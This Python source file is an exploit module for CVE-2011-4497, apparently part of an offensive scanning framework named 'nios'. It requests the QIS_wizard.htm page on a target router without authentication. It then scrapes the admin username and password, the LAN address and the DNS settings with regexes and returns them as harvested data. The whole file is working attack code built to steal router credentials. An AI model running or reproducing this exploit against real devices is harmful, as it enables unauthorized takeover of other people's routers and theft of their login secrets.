# -*- coding: utf-8 -*-

import requests
import logging
import re

from nios.core.exploits.CExploitBase import CExploitBase
from nios.core.CNiosCore import CNiosCore
from nios.core.auxiliary import exception
from nios.core.CScheduler import CTask


REGEX_LIST = [
    re.compile(r"\"(lan_ipaddr)\"\svalue=\"([^\"]+)", re.I),
    re.compile(r"\"(lan_netmask)\"\svalue=\"([^\"]+)", re.I),
    re.compile(r"\"(http_username)\"\svalue=\"([^\"]+)", re.I),
    re.compile(r"\"(http_passwd)\"\svalue=\"([^\"]+)", re.I),
    re.compile(r"\"(wan_dnsenable_x)\"\svalue=\"([^\"]+)", re.I),
    re.compile(r"\"(wan_dns1_x)\"\svalue=\"([^\"]+)", re.I),
    re.compile(r"\"(wan_dns2_x)\"\svalue=\"([^\"]+)", re.I),
]

KEY_NAMES = [
    ("wan_dns1_x", "dns1"),
    ("wan_dns2_x", "dns2"),
    ("http_username", "login"),
    ("http_passwd", "password"),
]


class CVE_2011_4497(CExploitBase):

    mCve = 'CVE-2011-4497'

    def __init__(self, core: CNiosCore):
        self.mCore = core

    def __call__(self, host, port):
        url = f"http://{host}:{port}"

        result = self.executeRequest(f"{url}/QIS_wizard.htm")

        if result is not None:
            data = self.dataPostProccess(self.parseByRegex(result.content))
            return {self.mCve: data}

    @staticmethod
    def parseByRegex(content):
        data = {}
        for regex in REGEX_LIST:
            result = regex.search(content.decode())
            if not result:
                continue

            (key, value) = result.group(1), result.group(2)

            data.update({key: value})

        return data

    @staticmethod
    def dataPostProccess(data: dict) -> dict:
        for old, new in KEY_NAMES:
            if old in data:
                data[new] = data.pop(old)

        return data

    def executeRequest(self, url):
        httpTimeout = self.mCore.mConfig.get("timeout.http", 2)
        try:
            return requests.get(url, timeout=httpTimeout)
        except Exception:
            return None

